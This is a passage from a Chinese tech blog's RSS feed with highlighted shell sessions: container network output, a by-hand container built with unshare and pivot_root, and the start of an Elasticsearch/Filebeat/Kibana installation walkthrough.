<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">14:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> eth0@if15:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 7a:16:72:92:97:ea</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-netnsid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.17.0.1/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> global</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> eth0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.17.0.10/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> global</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> secondary</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> eth0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> fe80::7816:72ff:fe92:97ea/64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# ip a</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">LOOPBACK,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UNKNOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/loopback</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 127.0.0.1/8</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ::1/128</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">14:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> eth0@if15:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 7a:16:72:92:97:ea</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-netnsid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.17.0.10/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> global</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> eth0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> fe80::7816:72ff:fe92:97ea/64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# ip route add default via 172.17.0.1</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# ping 8.8.8.8</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">PING</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 8.8.8.8</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (8.8.8.8) 56(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">84</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) bytes of data.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 8.8.8.8:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> icmp_seq=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ttl=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">127</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> time=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28.8</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ms</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 8.8.8.8:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> icmp_seq=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ttl=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">127</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> time=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28.3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ms</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">^C</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>纯手工制作容器-命令行</title>
      <link>https://www.geekery.cn/note-book/Docker/%E7%BA%AF%E6%89%8B%E5%B7%A5%E5%88%B6%E4%BD%9C%E5%AE%B9%E5%99%A8-%E5%91%BD%E4%BB%A4%E8%A1%8C.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/%E7%BA%AF%E6%89%8B%E5%B7%A5%E5%88%B6%E4%BD%9C%E5%AE%B9%E5%99%A8-%E5%91%BD%E4%BB%A4%E8%A1%8C.html</guid>
      <source url="https://www.geekery.cn/rss.xml">纯手工制作容器-命令行</source>
      <description>纯手工制作容器-命令行</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 宿主机</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 防止namespace共享，默认创建新的rootfs，会被复制过去</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mount</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --make-rprivate</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">unshare</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --mount</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --uts</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --ipc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --net</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --pid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --fork</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /bin/bash</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># bind mount 为当前挂载点绑定一个新的挂载点。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mount</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --bind</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /root/alpine-3.17.3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /root/alpine-3.17.3</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 交换rootfs挂载点</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mkdir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> oldroot</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 更新挂载点</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ..</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> alpine-3.17.3/</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 交换rootfs挂载点</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">pivot_root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> oldroot/</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>EFK安装过程记录，监听netflow</title>
      <link>https://www.geekery.cn/note-book/ELK/EFK8.4.3%E9%83%A8%E7%BD%B2.html</link>
      <guid>https://www.geekery.cn/note-book/ELK/EFK8.4.3%E9%83%A8%E7%BD%B2.html</guid>
      <source url="https://www.geekery.cn/rss.xml">EFK安装过程记录，监听netflow</source>
      <description>EFK安装过程记录，监听netflow 说明 一般我们需要进行日志分析场景：直接在日志文件中 grep、awk 就可以获得自己想要的信息。但在规模较大也就是日志量多而复杂的场景中，此方法效率低下，面临问题包括日志量太大如何归档、文本搜索太慢怎么办、如何多维度查询。需要集中化的日志管理，所有服务器上的日志收集汇总。常见解决思路是建立集中式日志收集系统，将...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>说明</h2>
<p>一般我们需要进行日志分析场景：直接在日志文件中 grep、awk 就可以获得自己想要的信息。但在规模较大也就是日志量多而复杂的场景中，此方法效率低下，面临问题包括日志量太大如何归档、文本搜索太慢怎么办、如何多维度查询。需要集中化的日志管理，所有服务器上的日志收集汇总。常见解决思路是建立集中式日志收集系统，将所有节点上的日志统一收集，管理，访问。
Elastic Stack包含：</p>
<ul>
<li>Elasticsearch 是个开源分布式搜索引擎，提供搜集、分析、存储数据三大功能。它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。详细可参考Elasticsearch权威指南</li>
<li>Logstash 主要是用来日志的搜集、分析、过滤日志的工具，支持大量的数据获取方式。一般工作方式为c/s架构，client端安装在需要收集日志的主机上，server端负责将收到的各节点日志进行过滤、修改等操作在一并发往elasticsearch上去。
Kibana 也是一个开源和免费的工具，Kibana可以为 Logstash 和 ElasticSearch 提供的日志分析友好的 Web 界面，可以帮助汇总、分析和搜索重要数据日志。</li>
<li>Beats在这里是一个轻量级日志采集器，其实Beats家族有6个成员，早期的ELK架构中使用Logstash收集、解析日志，但是Logstash对内存、cpu、io等资源消耗比较高。相比</li>
<li>Logstash，Beats所占系统的CPU和内存几乎可以忽略不计</li>
</ul>
<h2>相关网站</h2>
<ul>
<li><a href="https://www.elastic.co/cn/downloads/" target="_blank" rel="noopener noreferrer">https://www.elastic.co/cn/downloads/</a></li>
<li><a href="https://www.elastic.co/cn/downloads/elasticsearch" target="_blank" rel="noopener noreferrer">https://www.elastic.co/cn/downloads/elasticsearch</a></li>
<li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/8.5/rpm.html#rpm-repo" target="_blank" rel="noopener noreferrer">https://www.elastic.co/guide/en/elasticsearch/reference/8.5/rpm.html#rpm-repo</a></li>
</ul>
<h2>构建yum源</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rpm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --import</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://artifacts.elastic.co/GPG-KEY-elasticsearch</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[elasticsearch]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Elasticsearch</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> repository</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 8.x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> packages</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">baseurl</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">https://artifacts.elastic.co/packages/8.x/yum</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">gpgcheck</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">1</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">gpgkey</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">https://artifacts.elastic.co/GPG-KEY-elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">enabled</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">1</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">autorefresh</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">1</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">type</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">rpm-md</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>Pre阶段</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> stop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> firewalld</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> firewalld</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">setenforce</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sed</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 's/SELINUX.*/SELINUX=disabled/g'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/selinux/conf</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>安装ES</h2>
<ul>
<li><a href="https://www.elastic.co/cn/downloads/elasticsearch" target="_blank" rel="noopener noreferrer">https://www.elastic.co/cn/downloads/elasticsearch</a></li>
</ul>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@monther ~]# yum list --showduplicates elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Loaded</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> plugins:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> fastestmirror</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Loading</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mirror</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> speeds</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cached</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hostfile</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> *</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> base:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mirrors.aliyun.com</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> *</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> epel:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mirrors.bfsu.edu.cn</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> *</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> extras:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ftp.sjtu.edu.cn</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> *</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> updates:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ftp.sjtu.edu.cn</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Available</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Packages</span></span>
